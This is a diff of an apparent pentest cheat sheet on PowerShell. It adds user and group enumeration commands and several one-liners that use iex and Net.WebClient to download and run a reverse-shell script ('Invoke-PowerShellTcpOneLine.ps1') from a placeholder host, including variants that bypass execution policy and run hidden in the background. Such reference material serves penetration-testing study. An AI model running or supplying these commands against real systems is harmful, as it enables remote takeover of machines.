@@ -38,6 +38,15 @@ import-module .\Powerspolit.psd1
 ```
 {% endcode %}
 
+### Check All Available Powershell Command
+
+```powershell
+Get-Command -Name "*Invoke*"
+Get-Command
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi61t18ptuUTq7RFezUuspvOLZt26gJsqhnA38XRxnwdt02TaEFATWJ6ync6A5wFyxIFcxGmO398G_e8-34zU4uxRBoMAfTCI4BYs8jGqu8EuJ5kf46MBJodCkK2jhkppnjSTRg3_a-bkKCAOsgiMfnA60mltPRIPan1H30PrwhKRNCDLOhFSW0Ax-3M14/s1010/get%20all%20available%20command.png" alt=""><figcaption><p>Get-Command</p></figcaption></figure>
+
 ### Copy  & Move
 
 How to copy file:
@@ -100,7 +109,24 @@ powershell.exe: Invoke-Expression
 
 {% code overflow="wrap" %}
 ```powershell
-iex ((New-Object Net.WebClient).DownloadString("http://example.com/script-exec.ps1"))
+iex ((New-Object Net.WebClient).DownloadString('http://example.local/Invoke-PowerShellTcpOneLine.ps1'))
+```
+{% endcode %}
+
+Or, from cmd.exe to powershell.exe
+
+{% code overflow="wrap" %}
+```powershell
+powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://example.local/Invo
+ke-PowerShellTcpOneLine.ps1'))"
+```
+{% endcode %}
+
+Or, use start /B to run the command in background.
+
+{% code overflow="wrap" %}
+```powershell
+start /B powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://example.local/Invoke-PowerShellTcpOneLine.ps1'))"
 ```
 {% endcode %}
 
@@ -140,9 +166,11 @@ net user
 net user asuka
 ```
 
-Localgroup stuff:
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyAVj1INMgIeK5kh7G_9aPZ8U60HuQWWzeXPLIAI75N0amaCt9yVQGeLxkGMaiZ6xqL7eSy1g5ctN9w-Uk-oZqg65VCrqaK5NnEFbbNdlq-y880XX5zP4Vik8P8YxsI7Lx3vVgRe4skx0wZhr9_z8HSFa0ES55QW7-kxsvPdO23Vjw5NaLRm-KGSVzUXE/s1021/whoami%20all.png" alt=""><figcaption><p>whoami /all</p></figcaption></figure>
 
-```powershell
+Check Local Group using Command Prompt:
+
+```
 net localgroup
 net localgroup Administrators
 ```
@@ -152,6 +180,8 @@ Check group member
 {% code overflow="wrap" %}
 ```powershell
 Get-LocalGroupMember -Group "Administrators"
-Get-ADGroupMember -Identity Administrators | Select-Object name, objectClass,distinguishedName
+Get-LocalGroupMember -Group "Administrators" |  Select-Object *
 ```
 {% endcode %}
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSwKtfQSeG7PGNF6Oz3A6iAK9G1lYqf6INpoLtXifRQHdHqNbR6yN3WfZMGEpZOU1wLxVpkZUB7iPEHLyHN0jENDO_QZIx-yO4tne-Buag5dDr8vINN3oxc3rlNM4xXznS5zNAushx6aqkR6Kd-F1La5jsSL0u7ClbtOsz2TcrczzRK91x_vLjZqKL4s4/s1050/powershell%20command.png" alt=""><figcaption><p>Get-LocalGroupMember</p></figcaption></figure>
